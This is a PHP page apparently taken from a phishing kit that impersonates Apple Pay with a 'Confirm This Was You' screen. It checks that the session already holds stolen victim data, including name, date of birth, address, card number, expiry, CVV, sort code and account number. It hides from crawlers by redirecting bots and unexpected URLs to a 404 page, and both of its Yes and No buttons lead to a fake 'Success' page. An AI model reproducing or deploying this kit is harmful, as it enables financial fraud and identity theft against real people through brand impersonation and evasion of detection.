<?php
ob_start();
session_start();
require 'inc/functions.php';

$realCurrent = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$shouldExpect = $OUR_ROOT_LINK . 'Confirm?sesh=dsfkjsdifj829u8423u432hn42&secure=true&active=3&time=4328748782213221&ua=dsfsjfi9u283u4';

if ($shouldExpect !== $realCurrent) {
  exit(header('Location: '.$OUR_404_PAGE));
}

if (checkValidBool($CrawlerDetect, $USER_AGENT) == true) {

    // Make sure our user has these sessions
    if(sessionsCheck(
      [
        ['name' => 'AllowedAccess'],
        ['name' => 'PastLogin'],
        ['name' => 'FullName'],
        ['name' => 'DOB'],
        ['name' => 'Address'],
        ['name' => 'Postcode'],
        ['name' => 'Phone'],
        ['name' => 'CardNumber'],
        ['name' => 'Expiry'],
        ['name' => 'Cvv'],
        ['name' => 'SortCode'],
        ['name' => 'AccountNumber']
      ]
    ) == false) {
        session_destroy();
        exit(header('Location: '.$OUR_ROOT_LINK));
    }
?>
<!DOCTYPE html>
<html lang="en">

<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">

  <title>Confirm This Was You - Apple Pay</title>

  <!-- Bootstrap core CSS -->
  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

  <!-- Custom styles for this template -->
  <link href="css/scrolling-nav.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA==" crossorigin="anonymous" />

  <style type="text/css">
    label {
      display: inline-block;
      width: auto;
      float: left;
      padding-top: 5px;
      text-align: left;
      font-size: 20px;
      width: 140px;
      font-weight: bold;
    }​
  </style>
</head>

<body id="page-top" style="margin-top: 80px;">

  <!-- Navigation -->
  <nav class="navbar navbar-expand-lg navbar-dark fixed-top" style="background: white;" id="mainNav">
    <div class="container">
      <a class="navbar-brand js-scroll-trigger" href="Details?sesh=387834u8734884387&secure=true&active=1&time=23989478578" style="color: #18befc; margin-left: 15px;"><i class="fas fa-chevron-left"></i> Back</a>
        
      <button class="" style="float: right!important; background: none; border: none;" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
        <a href="" style="color: #18befc; text-align: center;" class="navbar-brand js-scroll-trigger">Next</a>
      </button>

    </div>
  </nav>

  <section id="about">
    <div class="container" style="width: 95%;">
      <center>
      <div class="row">
        <div class="col-lg-12 mx-auto">
          <h1 style="font-size: 30px; text-align: center; font-weight: bold;">Confirmation</h1>
          <h5 style="text-align: center;">Did you add your card to Apple Pay?</h5>
          <div style="margin-top: 20px;">

            <a class="btn btn-primary btn-block mt-4" href="Success?sesh=fsfd45654dfgtrewrewrer&secure=true&active=1&time=3554543212346&ua=fsdgery56trht234ewr" style="border-radius: 10px;">No</a>
            <a class="btn btn-primary btn-block mt-4" href="Success?sesh=fsfd45654dfgtrewrewrer&secure=true&active=1&time=3554543212346&ua=fsdgery56trht234ewr" style="border-radius: 10px;">Yes</a>

          </div>
        </div>
      </div>
      </center>
    </div>
  </section>

  <!-- Bootstrap core JavaScript -->
  <script src="vendor/jquery/jquery.min.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

  <!-- Plugin JavaScript -->
  <script src="vendor/jquery-easing/jquery.easing.min.js"></script>

  <!-- Custom JavaScript for this theme -->
  <script src="js/scrolling-nav.js"></script>

</body>

</html>
<?php
} else {
    exit(header('Location: ' . $OUR_404_PAGE));
}
ob_end_flush();
?>
